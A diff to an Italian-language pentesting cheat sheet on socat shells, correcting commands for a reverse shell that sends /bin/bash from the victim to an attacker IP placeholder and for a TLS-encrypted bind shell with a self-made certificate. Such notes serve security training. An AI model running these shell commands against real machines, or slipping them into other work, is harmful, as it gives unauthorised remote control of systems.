@@ -41,7 +41,7 @@ socat -d TCP4-LISTEN:<PORT> STDOUT
 ```
 Macchina vittima 
 ```bash
-socat TCP4:<MIO_IP>:<PORT> EXEC:/bin/bash
+socat - TCP4:<MIO_IP>:<PORT> EXEC:/bin/bash
 ```
 -------------------------
 # Bind shell 
@@ -59,7 +59,7 @@ Inizialmente si ha la necessita di creare il certificato e la chiave privata per
 #Generazione della chiave e del certificato
 openssl req -x509 -newkey rsa:2048 -nodes -keyout rootCAKey.key -days 365 -out rootCACert.pem
 #Combinare il certificato e la chiave per darlo in input a socat
-cat rootCACert.pem rootCAKey.pem > shell.pem
+cat rootCACert.pem rootCAKey.key > shell.pem
 ```
 Macchina  vittima
 ```bash
@@ -67,5 +67,5 @@ socat OPENSSL-LISTEN:<PORTA>,cert=shell.pem,verify=0,fork EXEC:/bin/bash
 ```
 Macchina attaccante 
 ```bash
-socat OPENSSL:<IP>:<PORTA>,verify=0
+socat - OPENSSL:<IP>:<PORTA>,verify=0
 ```
